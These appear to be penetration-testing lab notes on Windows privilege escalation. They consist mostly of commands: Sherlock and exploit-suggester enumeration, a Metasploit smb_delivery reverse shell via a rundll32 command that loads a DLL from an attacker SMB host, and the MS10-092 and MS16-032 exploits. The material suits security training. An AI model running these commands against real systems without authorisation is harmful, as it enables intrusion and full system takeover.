        -Querying Current Patch Level

        C:\> wmic qfe

        -Running Sherlock

        PS C:\> Set-ExecutionPolicy bypass -Scope process

        PS C:\> Import-Module .\Sherlock.ps1
        PS C:\> Find-AllVulns


        -Obtaining a Meterpreter Shell
        
        From the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a Meterpreter reverse shell. We can do this several ways, but one easy way is using the smb_delivery module.


        msf6  > search smb_delivery



        -Rundll Command on Target Host

        C:\> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0


        -Searching for Local Privilege Escalation Exploit

        From here, let's search for the MS10_092 Windows Task Scheduler '.XML' Privilege Escalation module.

        msf6 exploit(windows/smb/smb_delivery) > search 2010-3338



        -Migrating to a 64-bit Process

        Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the smb_delivery step.


        msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

        meterpreter > getpid

        Current pid: 2268

        meterpreter > ps


        meterpreter > migrate 2796

        meterpreter > background


        -Setting Privilege Escalation Module Options

        msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1

        msf6 exploit(windows/local/ms10_092_schelevator) > exploit



                -Windows Desktop Versions
        

        --Attacking Windows 7


        -Install Python Dependencies (local VM only) for windows-exploit-suggester.py

        $ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
       
        $ sudo tar -xf setuptools-2.0.tar.gz
       
        $ cd setuptools-2.0/
       
        $ sudo python2.7 setup.py install

        $ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
       
        $ sudo tar -xf xlrd-1.0.0.tar.gz
       
        $ cd xlrd-1.0.0/
       
        $ sudo python2.7 setup.py install


        Once this is done, we need to capture the systeminfo command's output and save it to a text file on our attack VM.

        -Updating the Local Microsoft Vulnerability Database

        $ sudo python2.7 windows-exploit-suggester.py --update

        -Running Windows Exploit Suggester

        $ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

        
        -Metasploit exploit sugestor 
        
        Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this local exploit suggester module which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

        -Exploiting MS16-032 with PowerShell PoC

        (  https://www.exploit-db.com/exploits/39719  )

        Let's use a PowerShell PoC to attempt to exploit this and elevate our privileges.

        PS C:\> Set-ExecutionPolicy bypass -scope process


        PS C:\> Import-Module .\Invoke-MS16-032.ps1
        PS C:\> Invoke-MS16-032


